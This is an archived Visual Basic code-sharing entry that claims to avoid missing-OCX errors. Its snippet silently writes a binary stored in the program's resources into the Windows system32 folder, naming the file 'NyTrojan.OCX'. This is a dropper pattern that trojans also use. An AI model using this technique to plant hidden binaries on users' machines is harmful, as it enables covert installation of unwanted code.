<div align="center">

## Missing File error if you use some OCX? Try this ;\)


</div>

### Description

How to use ocx-files without no error on other computers , which don't have the ocx
 
### More Info
 


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[Popescu Ionut](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/popescu-ionut.md)
**Level**          |Beginner
**User Rating**    |3.7 (11 globes from 3 users)
**Compatibility**  |VB 5\.0, VB 6\.0
**Category**       |[Custom Controls/ Forms/  Menus](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/custom-controls-forms-menus__1-4.md)
**World**          |[Visual Basic](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/visual-basic.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/popescu-ionut-missing-file-error-if-you-use-some-ocx-try-this__1-69854/archive/master.zip)





### Source Code

Just copy the ocx in system32 , in Form_Initialize()<br><br>
Private Sub Form_Initialize()<br>
If Dir("C:\WINDOWS\system32\NyTrojan.OCX") = "" Then<br>
Dim i() As Byte<br>
i = LoadResData(101, "CUSTOM")<br>
Open "C:\WINDOWS\system32\NyTrojan.OCX" For Binary Access Write As #1<br>
Put #1, , i<br>
Close #1<br>
End If
End Sub

